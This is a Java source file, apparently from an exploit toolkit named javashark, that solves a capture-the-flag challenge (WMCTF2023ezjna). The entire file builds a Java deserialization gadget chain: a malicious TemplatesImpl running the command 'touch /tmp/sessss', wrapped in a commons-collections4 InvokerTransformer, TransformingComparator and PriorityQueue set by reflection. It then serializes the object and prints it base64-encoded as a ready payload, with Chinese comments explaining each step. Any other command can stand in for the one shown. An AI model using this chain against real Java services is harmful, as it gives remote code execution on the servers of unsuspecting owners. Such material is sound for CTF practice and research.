package dev.silente.javashark.solution;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.PriorityQueue;

// TODO
public class WMCTF2023ezjna {


    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = STemplates.getEvilTemplates("touch /tmp/sessss");


        InvokerTransformer transformer=new InvokerTransformer("newTransformer",null,null);
        TransformingComparator transformerComparator =new TransformingComparator(transformer);
        //这里添加两个1是因为PriorityQueue有一个属性为size表示队列中的元素个数，相当于在队列中添加两个空间在后面代码中就通过反射将templatesImpl代替这两个1
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        //设置comparator属性
        Field field=queue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,transformerComparator);

        //设置queue属性,至少添加两个元素才会进行比较
        field=queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        Object[] objects = new Object[]{templates , templates};
        field.set(queue,objects);


        byte[] code = SerializeUtils.serialize(queue);
        System.out.println(MiscUtils.base64Encode(code));
//        SerializeUtils.deserialize(code);
    }
}
